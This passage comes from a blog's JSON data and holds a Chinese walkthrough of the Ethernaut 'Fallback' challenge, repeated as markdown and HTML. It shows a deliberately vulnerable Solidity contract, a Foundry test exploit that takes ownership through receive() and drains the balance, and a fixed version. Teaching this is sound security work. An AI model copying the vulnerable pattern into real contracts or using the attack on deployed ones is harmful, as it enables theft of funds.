贡献与反馈</h2><p>如果你发现任何问题或有改进建议，欢迎：</p>\n<ul>\n<li>在 GitHub 提交 Issue</li>\n<li>发起 Pull Request</li>\n<li>在评论区讨论</li>\n</ul>\n<hr>\n<p><em>让我们一起构建更安全的 Web3 世界！</em> 🌟</p>\n"},{"title":"Ethernaut Level 1: Fallback - 回退函数权限提升攻击","date":"2025-01-25T06:10:00.000Z","updated":"2025-01-25T06:10:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"学习如何利用 Fallback 函数的权限验证漏洞实现合约控制权获取，这是 Ethernaut 系列的第一个基础攻击技术。","_content":"\n# 🎯 Ethernaut Level 1: Fallback - 回退函数权限提升攻击\n\n> **关卡链接**: [Ethernaut Level 1 - Fallback](https://ethernaut.openzeppelin.com/level/1)  \n> **攻击类型**: 权限提升、Fallback 函数漏洞  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n这是 Ethernaut 系列的第一个正式关卡，目标非常明确：\n\n1. **获取合约控制权** - 成为合约的 `owner`\n2. **转出所有余额** - 提取合约中的所有 ETH\n\n![Fallback Challenge](https://github.com/XuHugo/Ethernaut-Foundry-Solutions/raw/main/imgs/requirements/1-fallback-requirements.webp)\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n首先，我们来分析目标合约的关键代码：\n\n```solidity\ncontract Fallback {\n    mapping(address => uint) public contributions;\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        if(contributions[msg.sender] > contributions[owner]) {\n            owner = msg.sender;\n        }\n    }\n\n    function getContribution() public view returns (uint) {\n        return contributions[msg.sender];\n    }\n\n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n\n    // 🚨 关键漏洞点\n    receive() external payable {\n        require(msg.value > 0 && contributions[msg.sender] > 0);\n        owner = msg.sender;\n    }\n\n    function getOwner() public view returns (address) {\n        return owner;\n    }\n}\n```\n\n### 漏洞识别\n\n通过代码审计，我们发现了两种成为 `owner` 的方式：\n\n**方式一：通过 `contribute()` 函数**\n- 需要贡献超过 1000 ETH 才能获得控制权\n- 每次调用限制最多 0.001 ETH\n- 需要调用超过 100 万次，成本过高 ❌\n\n**方式二：通过 `receive()` 函数** ⭐\n- 只需满足两个简单条件：\n  1. `msg.value > 0` - 发送任意数量的 ETH\n  2. `contributions[msg.sender] > 0` - 之前有过贡献记录\n- 满足条件后直接成为 `owner` ✅\n\n### 攻击路径\n\n1. **建立贡献记录** - 调用 `contribute()` 发送少量 ETH\n2. **触发权限提升** - 直接向合约发送 ETH 触发 `receive()`\n3. **提取资金** - 调用 `withdraw()` 提取所有余额\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Fallback.sol\";\n\ncontract FallbackTest is Test {\n    Fallback public instance;\n    address public attacker = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // 部署目标合约\n        instance = new Fallback();\n        \n        // 给攻击者一些初始资金\n        vm.deal(attacker, 1 ether);\n        \n        // 给合约一些初始余额\n        vm.deal(address(instance), 1 ether);\n    }\n\n    function testFallbackExploit() public {\n        vm.startPrank(attacker);\n        \n        // 步骤1: 先贡献少量ETH以满足contributions[msg.sender] > 0\n        instance.contribute{value: 0.0001 ether}();\n        \n        // 验证贡献记录\n        assertGt(instance.getContribution(), 0);\n        \n        // 步骤2: 直接向合约发送ETH触发receive()函数\n        (bool sent, ) = address(instance).call{value: 1 wei}(\"\");\n        require(sent, \"Failed to send Ether to the Fallback\");\n        \n        // 验证已成为owner\n        assertEq(instance.getOwner(), attacker);\n        \n        // 步骤3: 提取所有资金\n        uint256 initialBalance = attacker.balance;\n        instance.withdraw();\n        \n        // 验证资金提取成功\n        assertGt(attacker.balance, initialBalance);\n        assertEq(address(instance).balance, 0);\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### 运行测试\n\n```bash\n# 运行 Fallback 关卡测试\nforge test --match-contract FallbackTest -vvv\n\n# 输出应该显示所有断言通过\n```\n\n## 🛡️ 防御措施\n\n### 问题根源\n\n1. **权限检查不当** - `receive()` 函数中没有适当的权限验证\n2. **逻辑设计缺陷** - 允许通过简单条件获得完整控制权\n3. **函数职责混乱** - 接收资金的函数不应包含权限变更逻辑\n\n### 安全修复建议\n\n```solidity\ncontract SecureFallback {\n    mapping(address => uint) public contributions;\n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n    \n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n    \n    function contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        \n        // ✅ 提高门槛，避免简单的权限提升\n        if(contributions[msg.sender] > contributions[owner] && \n           contributions[msg.sender] > 10 ether) {\n            owner = msg.sender;\n        }\n    }\n    \n    // ✅ 移除权限变更逻辑，只处理资金接收\n    receive() external payable {\n        // 仅记录接收的资金，不修改权限\n        emit FundsReceived(msg.sender, msg.value);\n    }\n    \n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n    \n    event FundsReceived(address sender, uint amount);\n}\n```\n\n## 📚 核心知识点\n\n### 1. Fallback 和 Receive 函数\n\n```solidity\n// receive() - 接收纯ETH转账时调用\nreceive() external payable {\n    // 处理逻辑\n}\n\n// fallback() - 调用不存在的函数或带数据的ETH转账时调用\nfallback() external payable {\n    // 处理逻辑\n}\n```\n\n### 2. 权限设计原则\n\n- **最小权限原则** - 给予最少必要的权限\n- **权限分离** - 不同功能使用不同权限级别\n- **权限检查** - 在关键操作前进行充分验证\n\n### 3. 安全开发最佳实践\n\n- **避免在特殊函数中实现关键逻辑**\n- **使用 OpenZeppelin 的 Ownable 模式**\n- **充分的单元测试覆盖**\n- **代码审计和同行评审**\n\n## 🎯 总结\n\nFallback 关卡虽然简单，但展示了智能合约安全的基础概念：\n\n- ✅ **函数职责分离的重要性**\n- ✅ **权限验证的必要性** \n- ✅ **特殊函数的使用注意事项**\n- ✅ **Foundry 测试框架的基本使用**\n\n这是学习智能合约安全的良好起点，为后续更复杂的攻击技术打下基础。\n\n---\n\n## 🔗 相关链接\n\n- **[下一关: Level 2 - Fallout](/2025/01/25/ethernaut-level-02-fallout/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*在智能合约的世界中，最简单的漏洞往往隐藏着最深刻的安全教训。* 🎓","source":"_posts/ethernaut-level-01-fallback.md","raw":"---\ntitle: 'Ethernaut Level 1: Fallback - 回退函数权限提升攻击'\ndate: 2025-01-25 14:10:00\nupdated: 2025-01-25 14:10:00\ncategories:\n  - Ethernaut 系列\n  - 基础攻击篇 (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - Fallback\n  - 权限提升\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"学习如何利用 Fallback 函数的权限验证漏洞实现合约控制权获取，这是 Ethernaut 系列的第一个基础攻击技术。\"\n---\n\n# 🎯 Ethernaut Level 1: Fallback - 回退函数权限提升攻击\n\n> **关卡链接**: [Ethernaut Level 1 - Fallback](https://ethernaut.openzeppelin.com/level/1)  \n> **攻击类型**: 权限提升、Fallback 函数漏洞  \n> **难度**: ⭐⭐☆☆☆\n\n## 📋 挑战目标\n\n这是 Ethernaut 系列的第一个正式关卡，目标非常明确：\n\n1. **获取合约控制权** - 成为合约的 `owner`\n2. **转出所有余额** - 提取合约中的所有 ETH\n\n![Fallback Challenge](https://github.com/XuHugo/Ethernaut-Foundry-Solutions/raw/main/imgs/requirements/1-fallback-requirements.webp)\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n首先，我们来分析目标合约的关键代码：\n\n```solidity\ncontract Fallback {\n    mapping(address => uint) public contributions;\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        if(contributions[msg.sender] > contributions[owner]) {\n            owner = msg.sender;\n        }\n    }\n\n    function getContribution() public view returns (uint) {\n        return contributions[msg.sender];\n    }\n\n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n\n    // 🚨 关键漏洞点\n    receive() external payable {\n        require(msg.value > 0 && contributions[msg.sender] > 0);\n        owner = msg.sender;\n    }\n\n    function getOwner() public view returns (address) {\n        return owner;\n    }\n}\n```\n\n### 漏洞识别\n\n通过代码审计，我们发现了两种成为 `owner` 的方式：\n\n**方式一：通过 `contribute()` 函数**\n- 需要贡献超过 1000 ETH 才能获得控制权\n- 每次调用限制最多 0.001 ETH\n- 需要调用超过 100 万次，成本过高 ❌\n\n**方式二：通过 `receive()` 函数** ⭐\n- 只需满足两个简单条件：\n  1. `msg.value > 0` - 发送任意数量的 ETH\n  2. `contributions[msg.sender] > 0` - 之前有过贡献记录\n- 满足条件后直接成为 `owner` ✅\n\n### 攻击路径\n\n1. **建立贡献记录** - 调用 `contribute()` 发送少量 ETH\n2. **触发权限提升** - 直接向合约发送 ETH 触发 `receive()`\n3. **提取资金** - 调用 `withdraw()` 提取所有余额\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Fallback.sol\";\n\ncontract FallbackTest is Test {\n    Fallback public instance;\n    address public attacker = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // 部署目标合约\n        instance = new Fallback();\n        \n        // 给攻击者一些初始资金\n        vm.deal(attacker, 1 ether);\n        \n        // 给合约一些初始余额\n        vm.deal(address(instance), 1 ether);\n    }\n\n    function testFallbackExploit() public {\n        vm.startPrank(attacker);\n        \n        // 步骤1: 先贡献少量ETH以满足contributions[msg.sender] > 0\n        instance.contribute{value: 0.0001 ether}();\n        \n        // 验证贡献记录\n        assertGt(instance.getContribution(), 0);\n        \n        // 步骤2: 直接向合约发送ETH触发receive()函数\n        (bool sent, ) = address(instance).call{value: 1 wei}(\"\");\n        require(sent, \"Failed to send Ether to the Fallback\");\n        \n        // 验证已成为owner\n        assertEq(instance.getOwner(), attacker);\n        \n        // 步骤3: 提取所有资金\n        uint256 initialBalance = attacker.balance;\n        instance.withdraw();\n        \n        // 验证资金提取成功\n        assertGt(attacker.balance, initialBalance);\n        assertEq(address(instance).balance, 0);\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### 运行测试\n\n```bash\n# 运行 Fallback 关卡测试\nforge test --match-contract FallbackTest -vvv\n\n# 输出应该显示所有断言通过\n```\n\n## 🛡️ 防御措施\n\n### 问题根源\n\n1. **权限检查不当** - `receive()` 函数中没有适当的权限验证\n2. **逻辑设计缺陷** - 允许通过简单条件获得完整控制权\n3. **函数职责混乱** - 接收资金的函数不应包含权限变更逻辑\n\n### 安全修复建议\n\n```solidity\ncontract SecureFallback {\n    mapping(address => uint) public contributions;\n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n    \n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n    \n    function contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        \n        // ✅ 提高门槛，避免简单的权限提升\n        if(contributions[msg.sender] > contributions[owner] && \n           contributions[msg.sender] > 10 ether) {\n            owner = msg.sender;\n        }\n    }\n    \n    // ✅ 移除权限变更逻辑，只处理资金接收\n    receive() external payable {\n        // 仅记录接收的资金，不修改权限\n        emit FundsReceived(msg.sender, msg.value);\n    }\n    \n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n    \n    event FundsReceived(address sender, uint amount);\n}\n```\n\n## 📚 核心知识点\n\n### 1. Fallback 和 Receive 函数\n\n```solidity\n// receive() - 接收纯ETH转账时调用\nreceive() external payable {\n    // 处理逻辑\n}\n\n// fallback() - 调用不存在的函数或带数据的ETH转账时调用\nfallback() external payable {\n    // 处理逻辑\n}\n```\n\n### 2. 权限设计原则\n\n- **最小权限原则** - 给予最少必要的权限\n- **权限分离** - 不同功能使用不同权限级别\n- **权限检查** - 在关键操作前进行充分验证\n\n### 3. 安全开发最佳实践\n\n- **避免在特殊函数中实现关键逻辑**\n- **使用 OpenZeppelin 的 Ownable 模式**\n- **充分的单元测试覆盖**\n- **代码审计和同行评审**\n\n## 🎯 总结\n\nFallback 关卡虽然简单，但展示了智能合约安全的基础概念：\n\n- ✅ **函数职责分离的重要性**\n- ✅ **权限验证的必要性** \n- ✅ **特殊函数的使用注意事项**\n- ✅ **Foundry 测试框架的基本使用**\n\n这是学习智能合约安全的良好起点，为后续更复杂的攻击技术打下基础。\n\n---\n\n## 🔗 相关链接\n\n- **[下一关: Level 2 - Fallout](/2025/01/25/ethernaut-level-02-fallout/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*在智能合约的世界中，最简单的漏洞往往隐藏着最深刻的安全教训。* 🎓","slug":"ethernaut-level-01-fallback","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbox0007bf5q5tek3nka","content":"<h1 id=\"🎯-Ethernaut-Level-1-Fallback-回退函数权限提升攻击\"><a href=\"#🎯-Ethernaut-Level-1-Fallback-回退函数权限提升攻击\" class=\"headerlink\" title=\"🎯 Ethernaut Level 1: Fallback - 回退函数权限提升攻击\"></a>🎯 Ethernaut Level 1: Fallback - 回退函数权限提升攻击</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/1\">Ethernaut Level 1 - Fallback</a><br><strong>攻击类型</strong>: 权限提升、Fallback 函数漏洞<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>这是 Ethernaut 系列的第一个正式关卡，目标非常明确：</p>\n<ol>\n<li><strong>获取合约控制权</strong> - 成为合约的 <code>owner</code></li>\n<li><strong>转出所有余额</strong> - 提取合约中的所有 ETH</li>\n</ol>\n<p><img src=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions/raw/main/imgs/requirements/1-fallback-requirements.webp\" alt=\"Fallback Challenge\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><p>首先，我们来分析目标合约的关键代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Fallback &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public contributions;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function contribute() public payable &#123;</span><br><span class=\"line\">        require(msg.value &lt; 0.001 ether);</span><br><span class=\"line\">        contributions[msg.sender] += msg.value;</span><br><span class=\"line\">        if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function getContribution() public view returns (uint) &#123;</span><br><span class=\"line\">        return contributions[msg.sender];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw() public onlyOwner &#123;</span><br><span class=\"line\">        payable(owner).transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 🚨 关键漏洞点</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function getOwner() public view returns (address) &#123;</span><br><span class=\"line\">        return owner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞识别\"><a href=\"#漏洞识别\" class=\"headerlink\" title=\"漏洞识别\"></a>漏洞识别</h3><p>通过代码审计，我们发现了两种成为 <code>owner</code> 的方式：</p>\n<p><strong>方式一：通过 <code>contribute()</code> 函数</strong></p>\n<ul>\n<li>需要贡献超过 1000 ETH 才能获得控制权</li>\n<li>每次调用限制最多 0.001 ETH</li>\n<li>需要调用超过 100 万次，成本过高 ❌</li>\n</ul>\n<p><strong>方式二：通过 <code>receive()</code> 函数</strong> ⭐</p>\n<ul>\n<li>只需满足两个简单条件：<ol>\n<li><code>msg.value &gt; 0</code> - 发送任意数量的 ETH</li>\n<li><code>contributions[msg.sender] &gt; 0</code> - 之前有过贡献记录</li>\n</ol>\n</li>\n<li>满足条件后直接成为 <code>owner</code> ✅</li>\n</ul>\n<h3 id=\"攻击路径\"><a href=\"#攻击路径\" class=\"headerlink\" title=\"攻击路径\"></a>攻击路径</h3><ol>\n<li><strong>建立贡献记录</strong> - 调用 <code>contribute()</code> 发送少量 ETH</li>\n<li><strong>触发权限提升</strong> - 直接向合约发送 ETH 触发 <code>receive()</code></li>\n<li><strong>提取资金</strong> - 调用 <code>withdraw()</code> 提取所有余额</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Fallback.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract FallbackTest is Test &#123;</span><br><span class=\"line\">    Fallback public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署目标合约</span><br><span class=\"line\">        instance = new Fallback();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给攻击者一些初始资金</span><br><span class=\"line\">        vm.deal(attacker, 1 ether);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给合约一些初始余额</span><br><span class=\"line\">        vm.deal(address(instance), 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testFallbackExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 步骤1: 先贡献少量ETH以满足contributions[msg.sender] &gt; 0</span><br><span class=\"line\">        instance.contribute&#123;value: 0.0001 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证贡献记录</span><br><span class=\"line\">        assertGt(instance.getContribution(), 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 步骤2: 直接向合约发送ETH触发receive()函数</span><br><span class=\"line\">        (bool sent, ) = address(instance).call&#123;value: 1 wei&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(sent, &quot;Failed to send Ether to the Fallback&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证已成为owner</span><br><span class=\"line\">        assertEq(instance.getOwner(), attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 步骤3: 提取所有资金</span><br><span class=\"line\">        uint256 initialBalance = attacker.balance;</span><br><span class=\"line\">        instance.withdraw();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证资金提取成功</span><br><span class=\"line\">        assertGt(attacker.balance, initialBalance);</span><br><span class=\"line\">        assertEq(address(instance).balance, 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行 Fallback 关卡测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FallbackTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出应该显示所有断言通过</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"问题根源\"><a href=\"#问题根源\" class=\"headerlink\" title=\"问题根源\"></a>问题根源</h3><ol>\n<li><strong>权限检查不当</strong> - <code>receive()</code> 函数中没有适当的权限验证</li>\n<li><strong>逻辑设计缺陷</strong> - 允许通过简单条件获得完整控制权</li>\n<li><strong>函数职责混乱</strong> - 接收资金的函数不应包含权限变更逻辑</li>\n</ol>\n<h3 id=\"安全修复建议\"><a href=\"#安全修复建议\" class=\"headerlink\" title=\"安全修复建议\"></a>安全修复建议</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureFallback &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public contributions;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function contribute() public payable &#123;</span><br><span class=\"line\">        require(msg.value &lt; 0.001 ether);</span><br><span class=\"line\">        contributions[msg.sender] += msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ✅ 提高门槛，避免简单的权限提升</span><br><span class=\"line\">        if(contributions[msg.sender] &gt; contributions[owner] &amp;&amp; </span><br><span class=\"line\">           contributions[msg.sender] &gt; 10 ether) &#123;</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ✅ 移除权限变更逻辑，只处理资金接收</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        // 仅记录接收的资金，不修改权限</span><br><span class=\"line\">        emit FundsReceived(msg.sender, msg.value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw() public onlyOwner &#123;</span><br><span class=\"line\">        payable(owner).transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event FundsReceived(address sender, uint amount);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"1-Fallback-和-Receive-函数\"><a href=\"#1-Fallback-和-Receive-函数\" class=\"headerlink\" title=\"1. Fallback 和 Receive 函数\"></a>1. Fallback 和 Receive 函数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// receive() - 接收纯ETH转账时调用</span><br><span class=\"line\">receive() external payable &#123;</span><br><span class=\"line\">    // 处理逻辑</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// fallback() - 调用不存在的函数或带数据的ETH转账时调用</span><br><span class=\"line\">fallback() external payable &#123;</span><br><span class=\"line\">    // 处理逻辑</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-权限设计原则\"><a href=\"#2-权限设计原则\" class=\"headerlink\" title=\"2. 权限设计原则\"></a>2. 权限设计原则</h3><ul>\n<li><strong>最小权限原则</strong> - 给予最少必要的权限</li>\n<li><strong>权限分离</strong> - 不同功能使用不同权限级别</li>\n<li><strong>权限检查</strong> - 在关键操作前进行充分验证</li>\n</ul>\n<h3 